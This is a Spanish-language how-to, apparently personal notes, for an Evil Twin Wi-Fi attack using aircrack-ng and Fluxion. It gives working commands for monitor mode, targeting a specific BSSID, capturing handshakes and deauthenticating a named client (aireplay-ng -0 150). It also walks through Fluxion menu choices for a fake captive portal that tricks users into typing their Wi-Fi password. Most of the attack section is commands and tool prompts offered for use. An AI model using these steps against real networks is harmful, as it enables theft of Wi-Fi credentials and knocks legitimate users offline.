ATAQUE EVIL TWIN CON LA HERRAMIENTAS AIRCRACK-NG Y FLUXION.
*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*

Requisitos para el ataque
*Antena que acepte modo monitor
*kali linux u otro sistema operativo linux

1* Capturar el handshake
2* Clonar la red victima
*Expulsar alos clientes y redirigirlos a nuestra red falsa
4*El usuario debe ingresar sus credenciales en la pagina web
5* Comprabar y comparar el handshake

git clone https://www.github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh
./fluxion.sh -i instalamos todas las depencias faltantes

modo monitor
airmon-ng check kill && airmon-ng start wlan0 

identificar Bssid de la red
airodump-ng wlan0

auditar red especifica
airodump-ng -c 11 --bssid 54:71:DD:BF:86:E4 -w /home/avh04/Analisis/captura  wlan0

Esto nos ayuda a obtener en handsheke de la red

desautenticar un dispositivo de la red
aireplay-ng -0 150 -a 54:71:DD:BF:86:E4 -c 74:74:46:c0:ff:d5 wlan0
1

numeros

[1] Portal Cautivo Crea un punto de acceso "gemelo malvado".
[1] fluxwl0  [+] TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS] En miejemplo. Tu deberasutilizar el nombre detu adaptador de red, llamese wlan0, wlan1, enp0s3 u otro.

[*] Select a wireless interface for target tracking.
3*skip
[*] Seleccione una interaz para realizar jamming.
[1] fluxwl0  [*] TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]  
[*] Selecccione una interfaz para el punto de acceso.
4
[*] Select a method of deauthentication                                                                           
[2] aireplay  
[1] hash - cowpatty
[2] cowpatty verification (recommended)


Dato Y nombres presentes en aircrack-ng que son muy importates.
*****************************************************************************************************************************************************************************

airodump-ng 
BSSID: corresponde a la dirección MAC del punto de acceso

PWR: corresponde al nivel de señal reportado por nuestra tarjeta inalámbrica, este valor va a depender del controlador de la tarjeta.

Beacons: corresponde al numero de paquetes-anuncio enviados por el AP,

Data: corresponde al numero de paquetes de datos capturados

CH: corresponde al numero de canal en el que se encuentra la señal del AP.

MB velocidad máxima soportada por el AP

ENC: indica si existe un algoritmo de cifrado en uso; OPN: sin cifrado

ESSID: este campo es conocido generalmente como SSID.

STATION: dirección MAC de cada estación asociada (clientes o usuarios).
********************************************************************************************************************************************************************************

aireplay-ng 
Ataque 0: desautenticacion

Ataque 1: ataque de autenticación falsa

Ataque 2: reenvio interactivo de paquetes

Ataque 3: reinyeccio de petición ARP

Ataque 4: ataque “chopchop” de korek

Ataque 5: ataque de frame.

/*/*/*/*//*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*
CREADOR: AVH04
ANGEL GABRIEL VALDIVIA FLORES